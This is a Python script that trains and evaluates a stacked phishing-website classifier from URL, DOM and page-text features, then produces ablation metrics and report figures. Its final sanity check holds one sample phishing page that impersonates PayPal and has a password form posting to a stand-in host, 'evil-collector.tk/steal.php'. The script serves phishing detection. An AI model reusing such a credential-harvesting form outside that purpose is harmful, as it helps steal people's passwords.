import json
import joblib
import numpy as np
import pandas as pd
import lightgbm as lgb
import shap
import matplotlib.pyplot as plt
import seaborn as sns

from sklearn.model_selection import StratifiedKFold
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.calibration import CalibratedClassifierCV, calibration_curve
from sklearn.metrics import (
    roc_auc_score, f1_score, precision_score, recall_score,
    brier_score_loss, roc_curve, precision_recall_curve
)

from features import extract_url_features, extract_dom_features, extract_clean_text

print("1/5 Loading processed train & test datasets...")
train_df = pd.read_parquet("data/processed/train.parquet")
test_df = pd.read_parquet("data/processed/test.parquet")

y_train = train_df["label"].values
y_test = test_df["label"].values

print("2/5 Extracting URL, DOM, and Sanitized HTML Text features...")
X_url_train = pd.DataFrame([extract_url_features(u) for u in train_df["url"]])
X_url_test = pd.DataFrame([extract_url_features(u) for u in test_df["url"]])

X_dom_train = pd.DataFrame([extract_dom_features(u, h) for u, h in zip(train_df["url"], train_df["html"])])
X_dom_test = pd.DataFrame([extract_dom_features(u, h) for u, h in zip(test_df["url"], test_df["html"])])

txt_train = [extract_clean_text(u, h) for u, h in zip(train_df["url"], train_df["html"])]
txt_test = [extract_clean_text(u, h) for u, h in zip(test_df["url"], test_df["html"])]

tfidf = TfidfVectorizer(max_features=12000, ngram_range=(1, 2), sublinear_tf=True, min_df=3)
X_txt_train = tfidf.fit_transform(txt_train)
X_txt_test = tfidf.transform(txt_test)

print("3/5 Training 3 Modality Experts via 5-Fold Out-of-Fold Stacking...")
skf = StratifiedKFold(n_splits=5, shuffle=True, random_state=42)
oof_preds = np.zeros((len(train_df), 3))

for fold, (tr_idx, val_idx) in enumerate(skf.split(X_url_train, y_train)):
    # Expert 1: URL Lexical
    m_url = lgb.LGBMClassifier(n_estimators=250, learning_rate=0.05, num_leaves=31, random_state=42 + fold, verbose=-1)
    m_url.fit(X_url_train.iloc[tr_idx], y_train[tr_idx])
    oof_preds[val_idx, 0] = m_url.predict_proba(X_url_train.iloc[val_idx])[:, 1]

    # Expert 2: DOM & Script Behavior
    m_dom = lgb.LGBMClassifier(n_estimators=250, learning_rate=0.05, num_leaves=31, random_state=42 + fold, verbose=-1)
    m_dom.fit(X_dom_train.iloc[tr_idx], y_train[tr_idx])
    oof_preds[val_idx, 1] = m_dom.predict_proba(X_dom_train.iloc[val_idx])[:, 1]

    # Expert 3: Semantic HTML/Text
    m_txt = LogisticRegression(C=2.0, max_iter=500)
    m_txt.fit(X_txt_train[tr_idx], y_train[tr_idx])
    oof_preds[val_idx, 2] = m_txt.predict_proba(X_txt_train[val_idx])[:, 1]

# Train final base models on full training set
final_url_model = lgb.LGBMClassifier(n_estimators=250, learning_rate=0.05, num_leaves=31, random_state=42, verbose=-1).fit(X_url_train, y_train)
final_dom_model = lgb.LGBMClassifier(n_estimators=250, learning_rate=0.05, num_leaves=31, random_state=42, verbose=-1).fit(X_dom_train, y_train)
final_txt_model = LogisticRegression(C=2.0, max_iter=500).fit(X_txt_train, y_train)

# Calibrated Late-Fusion Meta-Classifier (Platt Scaling)
base_meta = LogisticRegression(C=1.0)
meta_model = CalibratedClassifierCV(base_meta, method="sigmoid", cv=5)
meta_model.fit(oof_preds, y_train)

print("4/5 Evaluating Ablation Study on Locked Test Set...")
p_url_test = final_url_model.predict_proba(X_url_test)[:, 1]
p_dom_test = final_dom_model.predict_proba(X_dom_test)[:, 1]
p_txt_test = final_txt_model.predict_proba(X_txt_test)[:, 1]
test_meta_features = np.column_stack([p_url_test, p_dom_test, p_txt_test])
p_fused_test = meta_model.predict_proba(test_meta_features)[:, 1]

results = {}
for name, probs in [
    ("URL Lexical Expert", p_url_test),
    ("DOM/Script Behavior Expert", p_dom_test),
    ("Semantic HTML/Text Expert", p_txt_test),
    ("Calibrated Late-Fusion (Proposed)", p_fused_test),
]:
    preds_bin = (probs >= 0.5).astype(int)
    results[name] = {
        "ROC-AUC": round(float(roc_auc_score(y_test, probs)), 4),
        "F1-Score": round(float(f1_score(y_test, preds_bin)), 4),
        "Precision": round(float(precision_score(y_test, preds_bin)), 4),
        "Recall": round(float(recall_score(y_test, preds_bin)), 4),
        "Brier_Loss": round(float(brier_score_loss(y_test, probs)), 4),
    }

ablation_df = pd.DataFrame(results).T
print("\n=== ABLATION STUDY RESULTS (TEST SET) ===")
print(ablation_df.to_string())

# Save models & metadata
joblib.dump({
    "url_model": final_url_model,
    "dom_model": final_dom_model,
    "txt_model": final_txt_model,
    "tfidf": tfidf,
    "meta_model": meta_model,
    "url_cols": list(X_url_train.columns),
    "dom_cols": list(X_dom_train.columns),
}, "models/phishguard_bundle.joblib")

with open("reports/metrics_summary.json", "w") as f:
    json.dump(results, f, indent=2)

print("\n5/5 Generating Report & PPT Figures in reports/figures/...")
sns.set_theme(style="whitegrid")

# Plot 1: Ablation Bar Chart
ax = ablation_df[["ROC-AUC", "F1-Score", "Precision", "Recall"]].plot(kind="bar", figsize=(10, 5), ylim=(0.75, 1.01))
plt.title("Ablation Study: Individual Modalities vs. Calibrated Late Fusion", fontsize=13, fontweight="bold")
plt.ylabel("Score")
plt.xticks(rotation=15, ha="right")
plt.legend(loc="lower right")
plt.tight_layout()
plt.savefig("reports/figures/01_ablation_comparison.png", dpi=300)
plt.close()

# Plot 2: ROC Curves Comparison
plt.figure(figsize=(8, 6))
for name, probs in [
    ("URL Expert", p_url_test),
    ("DOM Expert", p_dom_test),
    ("HTML Text Expert", p_txt_test),
    ("Late Fusion (Proposed)", p_fused_test),
]:
    fpr, tpr, _ = roc_curve(y_test, probs)
    plt.plot(fpr, tpr, lw=2, label=f"{name} (AUC = {roc_auc_score(y_test, probs):.4f})")
plt.plot([0, 1], [0, 1], "k--", lw=1)
plt.title("ROC Curves Across Modalities", fontsize=13, fontweight="bold")
plt.xlabel("False Positive Rate")
plt.ylabel("True Positive Rate")
plt.legend(loc="lower right")
plt.tight_layout()
plt.savefig("reports/figures/02_roc_curves.png", dpi=300)
plt.close()

# Plot 3: Probability Calibration Curve (Reliability Diagram)
plt.figure(figsize=(7, 6))
prob_true, prob_pred = calibration_curve(y_test, p_fused_test, n_bins=10)
plt.plot(prob_pred, prob_true, "s-", lw=2, label=f"Calibrated Late Fusion (Brier={brier_score_loss(y_test, p_fused_test):.4f})")
plt.plot([0, 1], [0, 1], "k--", label="Perfectly Calibrated")
plt.title("Probability Calibration Curve (Reliability Diagram)", fontsize=13, fontweight="bold")
plt.xlabel("Mean Predicted Phishing Probability")
plt.ylabel("Actual Fraction of Phishing Sites")
plt.legend(loc="upper left")
plt.tight_layout()
plt.savefig("reports/figures/03_calibration_curve.png", dpi=300)
plt.close()

# Plot 4: SHAP Feature Importance (Combined URL + DOM Tabular)
X_tab_test = pd.concat([X_url_test, X_dom_test], axis=1)
tab_surrogate = lgb.LGBMClassifier(n_estimators=200, learning_rate=0.05, random_state=42, verbose=-1).fit(
    pd.concat([X_url_train, X_dom_train], axis=1), y_train
)
explainer = shap.TreeExplainer(tab_surrogate)
shap_vals = explainer.shap_values(X_tab_test.iloc[:400])
if isinstance(shap_vals, list):
    shap_vals = shap_vals[1]
plt.figure(figsize=(10, 6))
shap.summary_plot(shap_vals, X_tab_test.iloc[:400], show=False)
plt.title("SHAP Feature Impact on Phishing Risk Score", fontsize=13, fontweight="bold")
plt.tight_layout()
plt.savefig("reports/figures/04_shap_summary.png", dpi=300)
plt.close()

# Sanity Check on Deep Legitimate URLs
print("\n=== FALSE-POSITIVE SANITY CHECK ===")
sanity_cases = [
    ("https://mail.google.com/mail/u/0/#inbox", "<html><title>Gmail</title><body>Inbox</body></html>"),
    ("https://github.com/torvalds/linux/blob/master/Makefile", "<html><title>linux/Makefile</title><body>Code</body></html>"),
    ("http://paypal-account-security-verify.xyz/login.php", "<html><title>PayPal Security Alert</title><body>Verify your account immediately <form action='http://evil-collector.tk/steal.php'><input type='password'></form></body></html>"),
]
for u, h in sanity_cases:
    pu = final_url_model.predict_proba(pd.DataFrame([extract_url_features(u)]))[0, 1]
    pd_ = final_dom_model.predict_proba(pd.DataFrame([extract_dom_features(u, h)]))[0, 1]
    pt = final_txt_model.predict_proba(tfidf.transform([extract_clean_text(u, h)]))[0, 1]
    pf = meta_model.predict_proba(np.array([[pu, pd_, pt]]))[0, 1]
    print(f"{u}\n   -> Final Calibrated Phishing Probability: {pf:.2%} (URL={pu:.2%}, DOM={pd_:.2%}, Text={pt:.2%})")

print("\nAll models and report charts saved successfully!")